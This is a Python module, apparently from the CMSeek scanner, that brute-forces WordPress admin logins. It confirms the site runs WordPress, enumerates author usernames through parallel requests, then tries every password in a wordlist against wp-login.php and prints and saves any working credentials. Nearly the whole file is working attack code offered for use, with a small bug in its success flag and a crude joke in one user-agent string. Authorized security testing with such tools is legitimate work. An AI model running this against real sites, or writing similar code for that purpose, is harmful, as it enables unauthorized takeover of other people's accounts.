### WordPress Bruteforce module
### Version 1.0
### cmseekbruteforcemodule <- make sure you include this comment in any custom modules you create so that cmseek can recognize it as a part of it's module

import cmseekdb.basic as cmseek
import cmseekdb.sc as source # Contains function to detect cms from source code
import cmseekdb.header as header # Contains function to detect CMS from gathered http headers
import cmseekdb.dnv as advanced # Deep scan and Version Detection functions
import multiprocessing ## Let's speed things up a lil bit (actually a hell lot faster) shell we?
from functools import partial ## needed somewhere :/
import sys

def start():
    cmseek.clearscreen()
    cmseek.banner("WordPress Bruteforce Module")
    url = cmseek.targetinp("") # input('Enter Url: ')
    cmseek.info("Checking for WordPress")
    bsrc = cmseek.getsource(url, cmseek.randomua('thiscanbeanythingasfarasnowletitbewhatilovethemost'))
    if bsrc[0] != '1':
        # print(bsrc[1])
        cmseek.error("Could not get target source, CMSeek is quitting")
        cmseek.handle_quit()
    else:
        try1 = source.generator(bsrc[1])
        if try1[0] == '1' and try1[1] == 'wp':
            wpcnf = '1'
        else:
            try2 = source.check(bsrc[1], url)
            if try2[0] == '1' and try2[1] == 'wp':
                wpcnf = '1'
            else:
                wpcnf = '0'
    if wpcnf != '1':
        print(bsrc[1])
        cmseek.error('Could not confirm WordPress... CMSeek is quitting')
        cmseek.handle_quit()
    else:
        cmseek.success("WordPress Confirmed... Checking for WordPress login form")
        wploginsrc = cmseek.getsource(url + '/wp-login.php', cmseek.randomua('thatsprettygay'))
        if wploginsrc[0] == '1' and '<form' in wploginsrc[1]:
            cmseek.success("Login form found.. Detecting Username For Bruteforce")
            wpparamuser = []
            usrrange = range(31)
            pool = multiprocessing.Pool()
            prepareenum = partial(advanced.wpauthorenum, cmseek.randomua('ilovechickenaswell'), url)
            res  = pool.map(prepareenum,usrrange)
            for r in res:
                if r != None:
                    wpparamuser.append(r)

            if wpparamuser == []:
                customuser = input("[~] CMSeek could not enumerate usernames, enter username if you know any: ")
                if customuser == "":
                    cmseek.error("No user found, CMSeek is quitting")
                else:
                    wpparamuser.append(customuser)
            wpbruteusers = set(wpparamuser)

            for user in wpbruteusers:
                print('\n')
                cmseek.info("Bruteforcing User: " + cmseek.bold + user + cmseek.cln)
                pwd_file = open("wordlist/passwords.txt", "r")
                passwords = pwd_file.read().split('\n')
                for password in passwords:
                    if password != '' and password != '\n':
                        sys.stdout.write('[*] Testing Password: ')
                        sys.stdout.write('%s\r\r' % password)
                        sys.stdout.flush()
                        cursrc = cmseek.wpbrutesrc(url, user, password)
                        if 'wp-admin' in str(cursrc[3]):
                            cmseek.success('Password found!')
                            print(" |\n |--[username]--> " + cmseek.bold + user + cmseek.cln + "\n |\n |--[password]--> " + cmseek.bold + password + cmseek.cln + "\n |")
                            cmseek.success('Enjoy The Hunt!')
                            cmseek.savebrute(url,url + '/wp-login.php',user,password)
                            passfound = '1'
                            break
                        else:
                            continue
                        break
                if passfound == '0':
                        cmseek.error('\n\nCould Not find Password!')
                print('\n\n')

        else:
            cmseek.error("Couldn't find login form... CMSeeK is quitting")
            # print(wploginsrc[1])
            cmseek.handle_quit()
